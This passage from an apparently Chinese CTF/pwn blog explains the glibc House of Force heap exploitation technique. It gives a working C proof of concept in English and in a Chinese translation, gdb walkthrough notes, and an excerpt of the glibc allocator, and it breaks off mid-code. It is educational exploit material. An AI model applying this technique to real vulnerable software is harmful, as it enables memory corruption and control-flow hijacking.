class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   This PoC works also with ASLR enabled.</span></span><br><span class="line"><span class="comment">   It will overwrite a GOT entry so in order to apply exactly this technique RELRO must be disabled.</span></span><br><span class="line"><span class="comment">   If RELRO is enabled you can always try to return a chunk on the stack as proposed in Malloc Des Maleficarum </span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   Tested in Ubuntu 14.04, 64bit, Ubuntu 18.04</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nWelcome to the House of Force\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The top chunk is a special chunk. Is the last in memory &quot;</span></span><br><span class="line"><span class="string">&quot;and is the chunk that will be resized when malloc asks for more space from the os.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nIn the end, we will use this to overwrite a variable at %p.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Its current value is: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nLet&#x27;s allocate the first chunk, taking space from the wilderness.\n&quot;</span>);</span><br><span class="line"><span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The chunk of 256 bytes has been allocated at %p.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Real size (aligned and all that jazz) of our allocated chunk is %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow let&#x27;s emulate a vulnerability that can overwrite the header of the Top Chunk\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe top chunk starts at %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Old size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;New size of top chunk %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n&quot;</span></span><br><span class="line">   <span class="string">&quot;overflow) and will then be able to allocate a chunk right over the desired region.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The evil_size is calulcated as (nb is the number of bytes requested + space for metadata):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;we will malloc %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As expected, the new pointer is at the same place as the old top chunk: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nNow, the next chunk we overwrite will point at our target buffer.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... old string: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... doing strcpy overwrite with \&quot;YEAH!!!\&quot;...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... new string: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// some further discussion:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This controlled malloc will be called with a size parameter of evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This because the main_arena-&gt;top pointer is setted to current av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;and we \nwant to set this result to the address of malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;In order to do this we have malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The av-&gt;top after this big malloc will be setted in this way to malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;After that a new call to malloc will return av-&gt;top+8 ( +8 bytes for the header ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\nand basically return a chunk at (malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The large chunk with evil_size has been allocated here 0x%08x\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;The main_arena value av-&gt;top has been setted to malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;This last malloc will be served from the remainder code and will return the av-&gt;top+8 injected before\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><ul><li>同样地，为了更好的代码审计，我将该代码进行中文翻译</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   这个Poc在开启ASLR保护的时候也能使用.</span></span><br><span class="line"><span class="comment">   它将劫持got表,因此为了能准确应用这个技术RELRO保护必须关闭.</span></span><br><span class="line"><span class="comment">   如果开启RELRO保护,我们总能尝试返回一个chunk到栈上这个方法被 Malloc Des Maleficarum提出</span></span><br><span class="line"><span class="comment">   ( http://phrack.org/issues/66/10.html )</span></span><br><span class="line"><span class="comment">   测试在ubuntu14.04,64位,ubuntu 18.04</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss_var[] = <span class="string">&quot;This is a string that we want to overwrite.&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc , <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n欢迎来到 house of Force\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;House of Force 的利用方法是修改Top chunk并且让malloc返回一个任意值.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Top chunk 是一个特别的chunk,它在内存中的最后一个堆块 &quot;</span></span><br><span class="line"><span class="string">&quot;并且当malloc向操作系统申请更多的空间后这个chunk的起始地址将升高.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n最后,我们将使用Top chunk的这种运行机制去修改的值为: %p 的变量.\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;它当前的值为: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n让我们占用一部分Top chunk的空间,分配给第一个申请的chunk.\n&quot;</span>);</span><br><span class="line"><span class="type">intptr_t</span> *p1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个256字节的chunk已经被分配在地址为: %p 处.\n&quot;</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n现在堆由两个部分组成: 我们申请的堆块和Top chunk.\n&quot;</span>);</span><br><span class="line"><span class="type">int</span> real_size = malloc_usable_size(p1);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们已经分配的chunk对齐后的真实size为: %ld.\n&quot;</span>, real_size + <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n现在让我们模拟一个能修改Top Chunk头部的漏洞\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//----- VULNERABILITY ----</span></span><br><span class="line"><span class="type">intptr_t</span> *ptr_top = (<span class="type">intptr_t</span> *) ((<span class="type">char</span> *)p1 + real_size - <span class="keyword">sizeof</span>(<span class="type">long</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\nTop chunk起始地址为: %p\n&quot;</span>, ptr_top);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n使用一个很大的值修改Top Chunk的size位,以便我们能确保malloc不会调用mmap.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;之前的Top chunk的size值为 %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line">*(<span class="type">intptr_t</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>)) = <span class="number">-1</span>;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;新的Top chunk的size值为 %#llx\n&quot;</span>, *((<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> *)((<span class="type">char</span> *)ptr_top + <span class="keyword">sizeof</span>(<span class="type">long</span>))));</span><br><span class="line"><span class="comment">//------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n新的Top chunk的size非常大,我们在调用使用malloc时,就不会通过mmap系统调用分配堆块.\n&quot;</span></span><br><span class="line">   <span class="string">&quot;接下来,我们将分配一个chunk,使我们能够接近目标区域(通过整数溢出)\n&quot;</span></span><br><span class="line">   <span class="string">&quot;然后我们将能够分配一个chunk,这个chunk正好覆盖在目标区域上方.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 申请的堆块大小的计算方式为(size = malloc申请的大小 + 存储元数据的空间):</span></span><br><span class="line"><span class="comment"> * new_top = old_top + nb</span></span><br><span class="line"><span class="comment"> * nb = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req + 2sizeof(long) = new_top - old_top</span></span><br><span class="line"><span class="comment"> * req = new_top - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - 2sizeof(long) - old_top - 2sizeof(long)</span></span><br><span class="line"><span class="comment"> * req = dest - old_top - 4*sizeof(long)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> evil_size = (<span class="type">unsigned</span> <span class="type">long</span>)bss_var - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">4</span> - (<span class="type">unsigned</span> <span class="type">long</span>)ptr_top;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n我们想修改的目的地址为: %p, 而top chunk的地址为: %p, 所以计算头部的size,\n&quot;</span></span><br><span class="line">   <span class="string">&quot;我们将申请的堆块大小为: %#lx bytes.\n&quot;</span>, bss_var, ptr_top, evil_size);</span><br><span class="line"><span class="type">void</span> *new_ptr = <span class="built_in">malloc</span>(evil_size);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;正如所料, 这个新的指针指向的是之前top chunk的地址: %p\n&quot;</span>, new_ptr - <span class="keyword">sizeof</span>(<span class="type">long</span>)*<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* ctr_chunk = <span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;\n现在,之后我们要修改的接下去的一个chunk将指向目标缓冲区.\n&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(100) =&gt; %p!\n&quot;</span>, ctr_chunk);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;最后,我们修改这个值Now, we can finally overwrite that value:\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... 之前的字符串为: %s\n&quot;</span>, bss_var);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... 我们把\&quot;YEAH!!!\&quot;赋值进去 ...\n&quot;</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(ctr_chunk, <span class="string">&quot;YEAH!!!&quot;</span>);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... 新的字符串为: %s\n&quot;</span>, bss_var);</span><br><span class="line"></span><br><span class="line">assert(ctr_chunk == bss_var);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 一些进一步总结:</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;修改完Top chunk后,我们调用malloc所传递的参数的值需要按照如下计算evil_size = malloc_got_address - 8 - p2_guessed\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;因为 main_arena-&gt;top 指针被设置到 av-&gt;top + malloc_size &quot;</span></span><br><span class="line"><span class="comment">//&quot;并且我们想要设置结果地址为 malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;为了达到 malloc_got_address-8 = p2_guessed + evil_size\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;av-&gt;top将在我们申请很大堆块的堆块之后被设置为malloc_got_address-8\n\n&quot;);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;之后再次调用malloc将返回av-&gt;top+8这个地址( 头部元数据占8 字节 ),&quot;</span></span><br><span class="line"><span class="comment">//&quot;\n并且基本上返回一个chunk的地址为(malloc_got_address-8)+8 = malloc_got_address\n\n&quot;);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;这个evil_size的chunk已经被分配在地址为: 0x%08x 的地方\n&quot;,p2);</span></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;main_arena 的值(即av-&gt;top) 已经被设置为malloc_got_address-8=0x%08x\n&quot;,malloc_got_address);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fprintf(stderr, &quot;最后再使用malloc将从剩下的空间中申请并且malloc将返回之前注入的av-&gt;top+8\n&quot;);</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>接下来我们进行动态调试，首先字符串<code>This is a string that we want to overwrite.</code>，是在<code>0x602080</code>地址处</li><li>由于调试的时候会出现异常情况从而导致退出<code>gdb</code>调试，并且也没有关闭堆地址随机偏移，这就导致了图片中有些地址会改变</li><li>我们先执行一次<code>malloc(0x100)</code>，此时实际申请的堆块大小为<code>0x110</code>，此时<code>top_chunk</code>的<code>size位</code>是这样的，这时我们程序就有两个堆块。一个是malloc申请回来可以使用的堆块，是不能使用的待申请的堆块<code>top_chunk</code></li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211230308853.png" alt="image-20250211230308853"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211231056792.png" alt="image-20250211231056792"></p><ul><li>接下来我们就修改<code>Top_chunk</code>的<code>size</code>位，修改size位为<code>-1</code>，这样<code>Top_chunk</code>的<code>size</code>位就会变得非常大，当我们申请一个非常大块的内存时，就不会调用<code>mmap</code>，这个操作。</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211231325122.png" alt="image-20250211231325122"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211231502341.png" alt="image-20250211231502341"></p><ul><li>之后我们就计算<code>malloc</code>要申请的堆块大小。由<code>目的地址 - top_chunk起始地址(即prev_size的地址)-sizeof(long)*4(即0x20字节)</code>，由于<code>.bss</code>段的地址比<code>堆</code>地址小，这时申请的目的地址就会是负数<code>-13725872</code>（十六进制为<code>0xFFFFFFFFFF2E8F50</code>）</li><li>所以我们要申请的大小就是<code>malloc(-13725872)</code>，在申请完之后<code>Top_chunk</code>的地址就会变成<code>0x602070</code>其<code>prev_size和size</code>这两个位都在<code>This is a string that we want to overwrite.</code>这个字符串的上方</li></ul><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211233126674.png" alt="image-20250211233126674"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211233206525.png" alt="image-20250211233206525"></p><p><img src="/2025/01/29/CTFblog/PWN%E7%B3%BB%E5%88%97blog/Linux_pwn/2.%E5%A0%86%E7%B3%BB%E5%88%97/PWN%E5%A0%86house-of-force/image-20250211233911215.png" alt="image-20250211233911215"></p><ul><li>这个来具体介绍一下为什么<code>Top_chunk</code>的地址会变成<code>0x602070</code>，这里的需要用到整数溢出和堆块的隐式链表技术。这时我们就要查看一下上面<code>top_chunk</code>源码这边，关键点在<code>chunk_at_offset (victim, nb)</code>这边<ul><li><code>nb</code>这个变量是用户申请的堆块大小，经过对齐等操作后要申请的实际大小。</li><li><code>victim</code>这个变量在对<code>top_chunk</code>操作时就是指向<code>top_chunk</code>的起始地址</li><li>我们注意到这个语句<code>remainder = chunk_at_offset (victim, nb);</code>，它执行的是<code>victim+nb</code>（这就是一个切割<code>top_chunk</code>的操作），所以当我们堆块申请的是负数的时候<code>victim + nb</code>就会降低<code>top_chunk</code>的地址。(利用隐式链表技术更新top_chunk的指针)</li><li>这时就会使得<code>top_chunk</code>的起始地址在<code>bss</code>段中。</li><li>这时我们<code>top_chunk</code>的<code>size</code>位就会发生整数溢出<code>-1-(-13725888)</code></li><li>这边还要注意一下：<strong>我们需要通过申请负值来修改top_chunk的地址为低地址，而负值在malloc中有一处比较会导致非常大，所以必须要溢出修改top_chunk的size位为<code>-1</code>从而绕过判断检查(这是在之后打level1调试出来体会到的)</strong></li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">        &#123;</span><br><span class="line">          remainder_size = size - nb;</span><br><span class="line">          remainder = chunk_at_offset (victim, nb);</span><br><span class="line">          av-&gt;top = remainder;</span><br><span class="line">          set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                    (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">          set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem 